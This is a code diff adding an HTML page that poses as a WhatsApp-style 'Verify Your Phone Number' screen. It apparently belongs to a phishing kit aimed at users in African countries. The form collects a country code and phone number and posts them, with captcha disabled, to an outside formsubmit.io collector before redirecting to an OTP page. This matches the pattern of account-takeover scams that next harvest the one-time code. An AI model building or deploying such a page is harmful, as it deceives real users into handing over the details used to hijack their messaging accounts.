@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <style>
+        /* Reset some default browser styles */
+        body, h2, p, input, select, button, option {
+            margin: 0;
+            padding: 0;
+            font-family: 'Cursive', cursive; 
+        }
+
+        /* Apply WhatsApp-like background color */
+        /* Apply WhatsApp-like background image */
+body {
+    background-image: url('images/CYCLE12.jpg'); /* Specify the path to your image */
+    background-size: cover; /* Scale the image to cover the entire viewport */
+    background-repeat: no-repeat; /* Prevent image repetition */
+    background-position: center center; /* Center the image */
+} 
+
+  .inputform {
+       display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 70vh;
+    margin: 0; /* Remove default margin */
+    padding: 0; /* Remove default padding */
+}
+
+
+        /* Style the WhatsApp container */
+        .whatsapp-container {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 100%;
+            opacity: 0.7;
+        }
+
+        /* Style the page title */
+        h2 {
+    font-size: 30px;
+    background: linear-gradient(45deg, #ff4d4d, #ffb6c1); /* Background gradient */
+    margin-bottom: 15px;
+    -webkit-background-clip: text; /* Clip text to background */
+    color: transparent; /* Make text transparent */
+    
+}
+
+
+        /* Style the message */
+        p {
+            font-size: 18.5px;
+            margin-bottom: 20px;
+            color: linear-gradient(45deg, #ff4d4d, #ffb6c1); 
+        }
+        
+/* Style the phone input container */
+.phone-input {
+/* Style the phone input container */
+.phone-input {
+    display: flex;
+    flex-direction: row; /* Change to row */
+    justify-content: space-between; /* Add this line */
+    align-items: center;
+}
+
+/* Style the country code input field */
+.country-code {
+    border: none;
+    border-bottom: 1px solid #ccc;
+    font-size: 16px;
+    padding: 10px;
+    padding-left:6px;
+    margin-bottom: 10px;
+    width: 25%;
+    outline: none;
+    border-radius: 30px;
+    background: linear-gradient(45deg, #ff4d4d, #ffb6c1); /* Background gradient */
+    margin-bottom: 15px;
+   /* -webkit-background-clip: text; /* Clip text to background */
+  /*  color: transparent; /* Make text transparent */
+}
+
+}
+
+/* Style the rest of the phone number input field */
+#phoneNumber {
+    border: none;
+    border-bottom: 1px solid #ccc;
+    font-size: 16px;
+    padding: 10px;
+    margin-bottom: 10px;
+    width: 65%; /* Adjust the width */
+    outline: none;
+    color: white;
+    background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
+    border-radius: 18px;
+}
+            
+#phoneNumber::placeholder {
+    color: white;
+    font-size: 16px;
+}
+
+        
+
+/* Style the OTP button */
+#otpButton {
+    background: linear-gradient(45deg, #ff4d4d, #ffb6c1);
+    color: #fff;
+    font-size: 15px;
+    padding: 10px 20px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    width: 100%; /* Add this line to make it full width */
+    margin-top: 10px; /* Add this line for spacing */
+}
+
+/* Hover effect for OTP button */
+#otpButton:hover {
+    background-color: #128c7e;
+}
+
+
+            
+
+.logo-container {
+    margin: 0 0; /* Center horizontally and add margin at the bottom */
+    z-index: 2; /* Place the logo above the overlay */
+    display: flex;
+    justify-content: center; /* Center horizontally */
+    align-items: center; /* Center vertically */
+    width: 80px;
+    background: linear-gradient(45deg, #ff4d4d, #ffb6c1); /* Apply the gradient as the background */
+    padding: 0% 140px; /* Vertically shorter, horizontally wider padding */
+    opacity: 0.7;
+    
+}
+
+
+.logo {
+    width: 100px;
+    background-color: linear-gradient(45deg, #ff4d4d, #ffb6c1); /*  rgba(255, 255, 255, 0.8); /* Translucent white background */
+    border-radius: 100000000000000000px; /* Rounded corners */
+    animation: fadeInOut 4s ease-in-out infinite;
+    }
+
+    @keyframes fadeInOut {
+        0%, 100% {
+            opacity: 0;
+        }
+        50% {
+            opacity: 1;
+        }
+    }
+
+            /* Add this CSS for the loading spinner */
+.spinner {
+    border: 6px solid #ff4d4d;
+    border-radius: 50%;
+    border-top: 4px solid #ff4d4d;
+    width: 60px;
+    height: 60px;
+    animation: spin 2s linear infinite;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    display: none; /* Initially hidden */
+}
+
+@keyframes spin {
+    0% { transform: translate(-50%, -50%) rotate(0deg); }
+    100% { transform: translate(-50%, -50%) rotate(360deg); }
+}
+
+            
+
+    </style>
+</head>
+<body>
+
+<div class="logo-container">
+        <img src="images/casalogo.png" alt="Harem Logo" class="logo">
+    </div>
+    
+  
+        <div class="inputform">
+    
+    <div class="whatsapp-container">
+        <h2>Verify Your Phone Number</h2>
+        <p>Input phone number to receive otp verification:</p>
+        
+<!-- Add a loading spinner initially hidden -->
+    <div id="loading-spinner" class="spinner"></div>
+         
+
+        
+            <form id="contactform" class="phone-input" action="https://formsubmit.io/send/42b5a94f-08e0-4850-aa08-970cbc3b421a" method="POST">
+    <input name="_redirect" type="hidden" value="OTP.html">
+<input type="hidden" name="_captcha" value="false">
+    <select class="country-code" name="countryCode" required>
+        <option value="" disabled selected>Select Country Code</option>
+        <option value="+234">(+234) NIG</option>
+        <option value="+254">(+254) KEN</option>
+        <option value="+27">(+27) ZAF</option>
+        <option value="+233">(+233) GHA</option>
+        <option value="+256">(+256) UGA</option>
+        <option value="+255">(+255) TZA</option>
+        <option value="+225">(+225) CIV</option>
+        <option value="+213">(+213) ALG</option>
+        <option value="+220">(+220) GMB</option>
+        <option value="+237">(+237) CMR</option>
+        <option value="+260">(+260) ZMB</option>
+        <option value="+263">(+263) ZWE</option>
+    </select>
+    <input type="tel" name="phoneNumber" id="phoneNumber"  placeholder="Phone Number" required pattern="[0-9]*" minlength="10">
+    <button id="otpButton" type="submit">OTP VERIFICATION</button>
+            </form>
+    </div>
+        
+    </div>
+        
+    <script>
+        const otpButton = document.getElementById('otpButton');
+const loadingSpinner = document.getElementById('loading-spinner');
+
+otpButton.addEventListener('click', function () {
+    // Show the loading spinner
+    loadingSpinner.style.display = 'block';
+
+    // Delay for 3 seconds (adjust the time as needed)
+    setTimeout(function () {
+        window.location.href = 'OTP.html'; // Redirect to OTP page
+    }, 3000);
+});
+
+    </script>
+
+<script>
+  document.getElementById("contactform").addEventListener("submit", function (event) {
+    const countryCode = document.querySelector(".country-code").value;
+    const phoneNumber = document.querySelector("input[name='phoneNumber']").value;
+
+    if (countryCode === "" || phoneNumber === "") {
+      alert("Please fill in all required fields.");
+      event.preventDefault(); // Prevent form submission
+    }
+  });
+</script>
+    
+</body>
+</html>
